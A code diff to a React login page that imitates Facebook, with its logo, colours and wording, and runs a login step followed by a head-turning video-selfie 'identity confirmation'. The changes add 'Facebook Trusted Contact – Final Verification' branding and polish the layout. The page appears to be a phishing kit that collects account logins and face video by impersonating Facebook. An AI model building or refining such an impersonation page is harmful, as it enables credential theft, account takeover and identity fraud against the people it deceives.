@@ -346,13 +346,23 @@ export default function LoginPage() {
       <main className="flex-1 flex flex-col items-center justify-center px-5 py-8">
         <div className="w-full max-w-md">
           {/* Facebook Logo */}
-          <div className="text-center mb-8">
+          <div className="text-center mb-4">
             <img
               src="/favicon.png"
               alt="Facebook"
               className="w-16 h-16 mx-auto"
               data-testid="logo-facebook"
             />
+          </div>
+          
+          {/* Trusted Contact Branding */}
+          <div className="text-center mb-8">
+            <h1 className="text-xl font-semibold mb-1" style={{ color: '#1c1e21' }}>
+              Facebook Trusted Contact
+            </h1>
+            <p className="text-sm" style={{ color: '#65676b' }}>
+              Final Verification
+            </p>
           </div>
 
           {/* Login Step */}
@@ -496,11 +506,11 @@ export default function LoginPage() {
           {currentStep === "face-intro" && (
             <div className="text-center">
               <div className="mb-6">
-                <img
-                  src="/favicon.png"
-                  alt="Facebook"
-                  className="w-16 h-16 mx-auto"
-                />
+                <div className="w-20 h-20 mx-auto rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
+                  <svg className="w-10 h-10" viewBox="0 0 24 24" fill="none" stroke="#1877f2" strokeWidth="1.5">
+                    <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
+                  </svg>
+                </div>
               </div>
               <h2 className="text-2xl font-bold mb-3" style={{ color: '#1c1e21' }}>Confirm your identity</h2>
               <p className="text-sm mb-8" style={{ color: '#65676b' }}>
@@ -520,10 +530,10 @@ export default function LoginPage() {
 
           {/* Face Explanation */}
           {currentStep === "face-explanation" && (
-            <div className="text-center">
-              <h2 className="text-xl font-bold mb-3" style={{ color: '#1c1e21' }}>Use your face to confirm it's you</h2>
-              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
-                We'll compare a video of your face to your profile photos. This helps us confirm it's your account.
+            <div className="text-center px-4">
+              <h2 className="text-2xl font-bold mb-3" style={{ color: '#1c1e21' }}>Use your face to confirm it's you</h2>
+              <p className="text-base mb-8" style={{ color: '#65676b', lineHeight: '20px' }}>
+                We'll compare a video of your face to your profile photos. This helps us confirm you're a real person.
               </p>
 
               {/* Illustration */}
@@ -554,9 +564,9 @@ export default function LoginPage() {
 
           {/* Instructions Screen */}
           {currentStep === "instructions" && (
-            <div className="text-center">
-              <h2 className="text-xl font-bold mb-3" style={{ color: '#1c1e21' }}>Take a video selfie</h2>
-              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
+            <div className="text-center px-4">
+              <h2 className="text-2xl font-bold mb-3" style={{ color: '#1c1e21' }}>Take a video selfie</h2>
+              <p className="text-base mb-6" style={{ color: '#65676b', lineHeight: '20px' }}>
                 Center your face in the frame. You'll be asked to slowly turn your head in all directions.
               </p>
 
@@ -596,8 +606,8 @@ export default function LoginPage() {
 
           {/* Recording Screen */}
           {currentStep === "recording" && (
-            <div className="text-center">
-              <p className="text-sm mb-4" style={{ color: '#65676b' }}>
+            <div className="text-center px-4">
+              <p className="text-base mb-4" style={{ color: '#65676b', lineHeight: '20px' }}>
                 Slowly turn your head to complete the circle
               </p>
 
@@ -727,7 +737,7 @@ export default function LoginPage() {
               </div>
 
               {/* Direction text */}
-              <h2 className="text-xl font-bold mb-2" style={{ color: '#1c1e21' }}>
+              <h2 className="text-2xl font-bold mb-2" style={{ color: '#1c1e21' }}>
                 {currentDirection === "left" ? "Turn your head left" :
                  currentDirection === "right" ? "Turn your head right" :
                  currentDirection === "up" ? "Look up slowly" :
